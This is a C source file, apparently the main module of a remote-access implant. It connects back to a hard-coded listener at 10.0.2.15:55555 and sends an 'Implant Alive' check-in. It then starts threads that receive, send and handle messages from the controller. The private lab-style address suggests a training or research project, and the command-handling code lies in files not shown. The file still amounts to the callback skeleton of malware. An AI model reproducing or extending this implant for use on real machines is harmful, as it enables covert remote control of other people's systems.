#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "utility.h"
#include "implant.h"
#include "queue.h"
#include "agent_comms.h"
#include "agent_message_handler.h"

// Globals
// Receive Queue
Queue* agent_receive_queue;
pthread_mutex_t agent_receive_queue_lock;
// Send Queue
Queue* agent_send_queue;
pthread_mutex_t agent_send_queue_lock;

int connect_to_listener(char* ip_addr, int port){

    int sockfd;
    int status;
    char* buffer;
    char* message = "Implant Alive\n";
    struct sockaddr_in addr;
    pthread_t agent_receive_tid, agent_send_tid, agent_message_handler_tid;

    if (ip_addr == NULL || !port){
        printf("Bad IP or port\n");
        return RET_ERROR;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip_addr, &addr.sin_addr) <= 0){
        printf("inet_pton failed\n");
        return RET_ERROR;
    }

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
        printf("socket failed\n");
        return RET_ERROR;
    }

    if ((status = connect(sockfd, (struct sockaddr*)&addr, sizeof(addr))) < 0){
        printf("connect failed\n");
        return RET_ERROR;
    }
    
    // Start agent receive thread
    pthread_create(&agent_receive_tid, NULL, agent_receive, &sockfd);
    // Start agent send thread
    pthread_create(&agent_send_tid, NULL, agent_send, &sockfd);
    // Start agent message handler thread
    pthread_create(&agent_message_handler_tid, NULL, agent_handle_message, &sockfd);
    
    pthread_join(agent_receive_tid, NULL);
    pthread_join(agent_send_tid, NULL);
    pthread_join(agent_message_handler_tid, NULL);

    close(sockfd);
    return RET_OK;;
}

#ifndef UNIT_TESTING
int main(int argc, char** argv){
    char* ip_addr = "10.0.2.15";
    int port = 55555;
    
    // Create receive queue
    agent_receive_queue = createQueue(QUEUE_SIZE);
    pthread_mutex_init(&agent_receive_queue_lock, NULL);
    // Create send queue
    agent_send_queue = createQueue(QUEUE_SIZE);
    pthread_mutex_init(&agent_send_queue_lock, NULL);
    
    connect_to_listener(ip_addr, port);
    return RET_OK;;
}
#endif /* UNIT_TESTING */


